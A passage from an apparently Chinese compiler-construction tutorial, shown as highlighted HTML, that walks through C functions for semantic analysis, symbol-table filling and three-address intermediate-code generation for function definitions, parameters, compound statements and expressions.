class="line">        ext_var_list(T-&gt;ptr[<span class="number">0</span>]); <span class="comment">/* 进入ID */</span></span><br><span class="line">        ext_var_list(T-&gt;ptr[<span class="number">1</span>]); <span class="comment">/* 进入EXT_DEC_LIST */</span></span><br><span class="line">        T-&gt;num = T-&gt;ptr[<span class="number">1</span>]-&gt;num + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ID:</span><br><span class="line">        rtn = fillSymbolTable(T-&gt;type_id, newAlias(), LEV, T-&gt;type, <span class="string">&#x27;V&#x27;</span>, T-&gt;offset); <span class="comment">// 最后一个变量名</span></span><br><span class="line">        <span class="keyword">if</span> (rtn == <span class="number">-1</span>)</span><br><span class="line">            semantic_error(T-&gt;pos, T-&gt;type_id, <span class="string">&quot;变量重复定义，语义错误&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T-&gt;place = rtn;</span><br><span class="line">        T-&gt;num = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>fillSymbolTable</code>：根据 <code>name</code> 查符号表，不能重复定义：<ul>
<li>重复定义，则返回 -1</li>
<li>不重复定义，则填表并返回符号在符号表中的位置序号</li>
</ul>
</li>
</ul>
<p>分析以上这3个函数的流程，就可以大概清楚属性计算的流程，在遍历 AST 的过程中就可以自下而上来分析节点属性</p>
<p><strong>函数定义</strong></p>
<p>FUNC_DEF：函数定义（TYPE，FUNC_DEC，COMP_STM）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func_def</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;type_id, <span class="string">&quot;int&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;type = INT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;type_id, <span class="string">&quot;float&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;type = FLOAT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;type_id, <span class="string">&quot;char&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;type = CHAR;</span><br><span class="line">    &#125;</span><br><span class="line">    T-&gt;width = <span class="number">0</span>;            <span class="comment">//函数的宽度设置为0,不会对外部变量的地址分配产生影响</span></span><br><span class="line">    T-&gt;offset = DX;			<span class="comment">//设置局部变量在活动记录中的偏移量初值</span></span><br><span class="line">    semantic_Analysis(T-&gt;ptr[<span class="number">1</span>]);  <span class="comment">//处理函数名和参数结点部分(不考虑寄存器传参)</span></span><br><span class="line">    T-&gt;offset += T-&gt;ptr[<span class="number">1</span>]-&gt;width; <span class="comment">//用形参单元宽度修改函数局部变量的起始偏移量</span></span><br><span class="line">    T-&gt;ptr[<span class="number">2</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">2</span>]-&gt;Snext, newLabel()); <span class="comment">//函数体语句执行结束后的位置属性</span></span><br><span class="line">    semantic_Analysis(T-&gt;ptr[<span class="number">2</span>]);         <span class="comment">//处理函数体结点</span></span><br><span class="line">    <span class="comment">//计算活动记录大小,这里offset属性存放的是活动记录大小,不是偏移</span></span><br><span class="line">    symbolTable.symbols[T-&gt;ptr[<span class="number">1</span>]-&gt;place].offset = T-&gt;offset + T-&gt;ptr[<span class="number">2</span>]-&gt;width;</span><br><span class="line">    T-&gt;code = merge(<span class="number">3</span>, T-&gt;ptr[<span class="number">1</span>]-&gt;code, T-&gt;ptr[<span class="number">2</span>]-&gt;code, genLabel(T-&gt;ptr[<span class="number">2</span>]-&gt;Snext)); <span class="comment">//函数体的代码作为函数的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>newLabel</code>：生成一个标号，标号命名形式为 “LABEL+序号”</li>
<li>函数 <code>genLabel</code>：生成标号语句</li>
</ul>
<p>FUNC_DEC：函数声明（PARAM_LIST）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func_dec</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rtn;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">opn</span> <span class="title">opn1</span>, <span class="title">opn2</span>, <span class="title">result</span>;</span></span><br><span class="line">    rtn = fillSymbolTable(T-&gt;type_id, newAlias(), LEV, T-&gt;type, <span class="string">&#x27;F&#x27;</span>, <span class="number">0</span>); <span class="comment">//函数不在数据区中分配单元,偏移量为0</span></span><br><span class="line">    <span class="keyword">if</span> (rtn == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        semantic_error(T-&gt;pos, T-&gt;type_id, <span class="string">&quot;函数名重复使用，可能是函数重复定义，语义错误&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        T-&gt;place = rtn;</span><br><span class="line">    result.kind = ID;</span><br><span class="line">    <span class="built_in">strcpy</span>(result.id, T-&gt;type_id);</span><br><span class="line">    result.offset = rtn;</span><br><span class="line">    T-&gt;code = genIR(FUNCTION, opn1, opn2, result); <span class="comment">//生成中间代码:FUNCTION 函数名</span></span><br><span class="line">    T-&gt;offset = DX;                                <span class="comment">//设置形式参数在活动记录中的偏移量初值</span></span><br><span class="line">    <span class="keyword">if</span> (T-&gt;ptr[<span class="number">0</span>]) <span class="comment">/* 判断是否有参数 */</span></span><br><span class="line">    &#123; </span><br><span class="line">        T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">        semantic_Analysis(T-&gt;ptr[<span class="number">0</span>]); <span class="comment">//处理函数参数列表</span></span><br><span class="line">        T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">        symbolTable.symbols[rtn].paramnum = T-&gt;ptr[<span class="number">0</span>]-&gt;num;</span><br><span class="line">        T-&gt;code = merge(<span class="number">2</span>, T-&gt;code, T-&gt;ptr[<span class="number">0</span>]-&gt;code); <span class="comment">//连接函数名和参数代码序列</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        symbolTable.symbols[rtn].paramnum = <span class="number">0</span>, T-&gt;width = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>genIR</code>：生成一条 TAC 的中间代码语句<ul>
<li>一般情况下，TAC 中涉及到2个运算对象和运算结果</li>
<li>如果是局部变量或临时变量，表示在运行时，其对应的存储单元在活动记录中，这时需要将其偏移量 offset 和数据类型同时带上，方便最后的目标代码生成</li>
<li>全局变量也需要带上偏移量</li>
</ul>
</li>
<li>查中间代码表可知 “FUNCTION 函数名” 不需要 <code>opn1 opn2</code>，只需要 <code>result</code></li>
</ul>
<p>PARAM_LIST：参数定义列表（PARAM_DEC）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">param_list</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">    semantic_Analysis(T-&gt;ptr[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (T-&gt;ptr[<span class="number">1</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset + T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">        semantic_Analysis(T-&gt;ptr[<span class="number">1</span>]);</span><br><span class="line">        T-&gt;num = T-&gt;ptr[<span class="number">0</span>]-&gt;num + T-&gt;ptr[<span class="number">1</span>]-&gt;num;             <span class="comment">//统计参数个数</span></span><br><span class="line">        T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width + T-&gt;ptr[<span class="number">1</span>]-&gt;width;       <span class="comment">//累加参数单元宽度</span></span><br><span class="line">        T-&gt;code = merge(<span class="number">2</span>, T-&gt;ptr[<span class="number">0</span>]-&gt;code, T-&gt;ptr[<span class="number">1</span>]-&gt;code); <span class="comment">//连接参数代码</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;num = T-&gt;ptr[<span class="number">0</span>]-&gt;num;</span><br><span class="line">        T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">        T-&gt;code = T-&gt;ptr[<span class="number">0</span>]-&gt;code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PARAM_DEC：参数定义（TYPE，ID）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">param_dec</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rtn;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">opn</span> <span class="title">opn1</span>, <span class="title">opn2</span>, <span class="title">result</span>;</span></span><br><span class="line">    rtn = fillSymbolTable(T-&gt;ptr[<span class="number">1</span>]-&gt;type_id, newAlias(), <span class="number">1</span>, T-&gt;ptr[<span class="number">0</span>]-&gt;type, <span class="string">&#x27;P&#x27;</span>, T-&gt;offset);</span><br><span class="line">    <span class="keyword">if</span> (rtn == <span class="number">-1</span>)</span><br><span class="line">        semantic_error(T-&gt;ptr[<span class="number">1</span>]-&gt;pos, T-&gt;ptr[<span class="number">1</span>]-&gt;type_id, <span class="string">&quot;参数名重复定义,语义错误&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;place = rtn;</span><br><span class="line">    T-&gt;num = <span class="number">1</span>;                                <span class="comment">//参数个数计算的初始值</span></span><br><span class="line">    T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;type == INT ? <span class="number">4</span> : <span class="number">8</span>; <span class="comment">//参数宽度</span></span><br><span class="line">    result.kind = ID;</span><br><span class="line">    <span class="built_in">strcpy</span>(result.id, symbolTable.symbols[rtn].alias);</span><br><span class="line">    result.offset = T-&gt;offset;</span><br><span class="line">    T-&gt;code = genIR(PARAM, opn1, opn2, result); <span class="comment">//生成:PARAM 形参名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>生成形式参数的中间代码</li>
</ul>
<p>COMP_STM：复合语句（DEF_LIST，STM_LIST）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">comp_stm</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LEV++; <span class="comment">//设置层号加1,并且保存该层局部变量在符号表中的起始位置在symbol_scope_TX</span></span><br><span class="line">    symbol_scope_TX.TX[symbol_scope_TX.top++] = symbolTable.index;</span><br><span class="line">    T-&gt;width = <span class="number">0</span>;</span><br><span class="line">    T-&gt;code = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (T-&gt;ptr[<span class="number">0</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">        semantic_Analysis(T-&gt;ptr[<span class="number">0</span>]); <span class="comment">//处理该层的局部变量DEF_LIST</span></span><br><span class="line">        T-&gt;width += T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">        T-&gt;code = T-&gt;ptr[<span class="number">0</span>]-&gt;code;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (T-&gt;ptr[<span class="number">1</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset + T-&gt;width;</span><br><span class="line">        <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">1</span>]-&gt;Snext, T-&gt;Snext); <span class="comment">//S.next属性向下传递</span></span><br><span class="line">        semantic_Analysis(T-&gt;ptr[<span class="number">1</span>]); <span class="comment">//处理复合语句的语句列表STM_LIST</span></span><br><span class="line">        T-&gt;width += T-&gt;ptr[<span class="number">1</span>]-&gt;width;</span><br><span class="line">        T-&gt;code = merge(<span class="number">2</span>, T-&gt;code, T-&gt;ptr[<span class="number">1</span>]-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">    LEV--; <span class="comment">//出复合语句,层号减1</span></span><br><span class="line">    symbolTable.index = symbol_scope_TX.TX[--symbol_scope_TX.top]; <span class="comment">//删除该作用域中的符号</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>symbol_scope_TX</code> 是一个存放 <code>symbolTable.index</code> 的栈结构</li>
</ul>
<p><strong>表达式</strong></p>
<p>下面给一个通用表达式 Exp 的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Exp</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (T)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (T-&gt;kind)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> ID: <span class="comment">// 名称(符号)</span></span><br><span class="line">                id_exp(T);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CHAR: <span class="comment">// char类型</span></span><br><span class="line">                char_exp(T);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> INT: <span class="comment">// int类型</span></span><br><span class="line">                int_exp(T);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FLOAT: <span class="comment">// float类型</span></span><br><span class="line">                float_exp(T);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ASSIGNOP: <span class="comment">// 赋值</span></span><br><span class="line">                assignop_exp(T);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PPLUS: <span class="comment">// 加减</span></span><br><span class="line">            <span class="keyword">case</span> MMINUS: <span class="comment">// 减减</span></span><br><span class="line">                oop_exp(T);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> AND: <span class="comment">// 且</span></span><br><span class="line">            <span class="keyword">case</span> OR: <span class="comment">// 或</span></span><br><span class="line">            <span class="keyword">case</span> RELOP: <span class="comment">// 二元运算符</span></span><br><span class="line">                relop_exp(T);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PLUSASSIGNOP: <span class="comment">// 加等于</span></span><br><span class="line">            <span class="keyword">case</span> MINUSASSIGNOP: <span class="comment">// 减等于</span></span><br><span class="line">            <span class="keyword">case</span> STARASSIGNOP: <span class="comment">// 乘等于</span></span><br><span class="line">            <span class="keyword">case</span> DIVASSIGNOP: <span class="comment">// 除等于</span></span><br><span class="line">            <span class="keyword">case</span> PLUS: <span class="comment">// 加</span></span><br><span class="line">            <span class="keyword">case</span> MINUS: <span class="comment">// 减</span></span><br><span class="line">            <span class="keyword">case</span> STAR: <span class="comment">// 乘</span></span><br><span class="line">            <span class="keyword">case</span> DIV: <span class="comment">// 除</span></span><br><span class="line">                op_exp(T);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FUNC_CALL: <span class="comment">//根据T-&gt;type_id查出函数的定义,如果语言中增加了实验教材的read,write需要单独处理一下</span></span><br><span class="line">                func_call_exp(T);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARGS: <span class="comment">//此处仅处理各实参表达式的求值的代码序列,不生成ARG的实参系列</span></span><br><span class="line">                args_exp(T);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>表达式 Exp 的类型很多，这里只选择几个简单分析：</p>
<p>ID：名称（NULL）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">id_exp</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rtn;</span><br><span class="line"></span><br><span class="line">    rtn = searchSymbolTable(T-&gt;type_id);</span><br><span class="line">    <span class="keyword">if</span> (rtn == <span class="number">-1</span>)</span><br><span class="line">        semantic_error(T-&gt;pos, T-&gt;type_id, <span class="string">&quot;变量未声明定义就引用，语义错误&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (symbolTable.symbols[rtn].flag == <span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">        semantic_error(T-&gt;pos, T-&gt;type_id, <span class="string">&quot;是函数名，不是普通变量，语义错误&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;place = rtn; <span class="comment">//结点保存变量在符号表中的位置</span></span><br><span class="line">        T-&gt;code = <span class="literal">NULL</span>; <span class="comment">//标识符不需要生成TAC</span></span><br><span class="line">        T-&gt;type = symbolTable.symbols[rtn].type;</span><br><span class="line">        T-&gt;offset = symbolTable.symbols[rtn].offset;</span><br><span class="line">        T-&gt;width = <span class="number">0</span>; <span class="comment">//未再使用新单元</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>INT：int 类型（其他基础类型同理）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">int_exp</span><span class="params">(struct node *T)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">opn</span> <span class="title">opn1</span>, <span class="title">opn2</span>, <span class="title">result</span>;</span></span><br><span class="line">    T-&gt;place = temp_add(newTemp(), LEV, T-&gt;type, <span class="string">&#x27;T&#x27;</span>, T-&gt;offset); <span class="comment">//为整常量生成一个临时变量</span></span><br><span class="line">    T-&gt;type = INT;</span><br><span class="line">    opn1.kind = INT;</span><br><span class="line">    opn1.const_int = T-&gt;type_int;</span><br><span class="line">    result.kind = ID;</span><br><span class="line">    <span class="built_in">strcpy</span>(result.id, symbolTable.symbols[T-&gt;place].alias);</span><br><span class="line">    result.offset = symbolTable.symbols[T-&gt;place].offset;</span><br><span class="line">    T-&gt;code = genIR(ASSIGNOP, opn1, opn2, result);</span><br><span class="line">    T-&gt;width = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>返回局部变量会生成一个临时变量，由于 int 和 float 会参与计算，因此需要一个临时变量来存储计算的结果</li>
<li>函数 <code>temp_add</code>：填写临时变量到符号表，返回临时变量在符号表中的位置</li>
</ul>
<p>ASSIGNOP：赋值（ID，Exp）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">assignop_exp</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">opn</span> <span class="title">opn1</span>, <span class="title">opn2</span>, <span class="title">result</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (T-&gt;ptr[<span class="number">0</span>]-&gt;kind != ID)</span><br><span class="line">    &#123;</span><br><span class="line">        semantic_error(T-&gt;pos, <span class="string">&quot;&quot;</span>, <span class="string">&quot;赋值语句没有左值，语义错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Exp(T-&gt;ptr[<span class="number">0</span>]); <span class="comment">//处理左值,例中仅为变量</span></span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">        Exp(T-&gt;ptr[<span class="number">1</span>]); <span class="comment">//处理右值</span></span><br><span class="line">        T-&gt;type = T-&gt;ptr[<span class="number">0</span>]-&gt;type;</span><br><span class="line">        T-&gt;width = T-&gt;ptr[<span class="number">1</span>]-&gt;width;</span><br><span class="line">        T-&gt;code = merge(<span class="number">2</span>, T-&gt;ptr[<span class="number">0</span>]-&gt;code, T-&gt;ptr[<span class="number">1</span>]-&gt;code);</span><br><span class="line"></span><br><span class="line">        opn1.kind = ID;</span><br><span class="line">        <span class="built_in">strcpy</span>(opn1.id, symbolTable.symbols[T-&gt;ptr[<span class="number">1</span>]-&gt;place].alias); <span class="comment">//右值一定是个变量或临时变量</span></span><br><span class="line">        opn1.offset = symbolTable.symbols[T-&gt;ptr[<span class="number">1</span>]-&gt;place].offset;</span><br><span class="line">        result.kind = ID;</span><br><span class="line">        <span class="built_in">strcpy</span>(result.id, symbolTable.symbols[T-&gt;ptr[<span class="number">0</span>]-&gt;place].alias);</span><br><span class="line">        result.offset = symbolTable.symbols[T-&gt;ptr[<span class="number">0</span>]-&gt;place].offset;</span><br><span class="line">        T-&gt;code = merge(<span class="number">2</span>, T-&gt;code, genIR(ASSIGNOP, opn1, opn2, result)); <span class="comment">//生成:x := y</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>生成赋值语句的中间代码</li>
</ul>
<p>FUNC_CALL：函数调用（ARGS）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func_call_exp</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rtn,width;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">T0</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">opn</span> <span class="title">opn1</span>, <span class="title">opn2</span>, <span class="title">result</span>;</span></span><br><span class="line">    rtn = searchSymbolTable(T-&gt;type_id);</span><br><span class="line">    <span class="keyword">if</span> (rtn == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        semantic_error(T-&gt;pos, T-&gt;type_id, <span class="string">&quot;函数未定义，语义错误&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (symbolTable.symbols[rtn].flag != <span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        semantic_error(T-&gt;pos, T-&gt;type_id, <span class="string">&quot;不是函数名，不能进行函数调用，语义错误&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    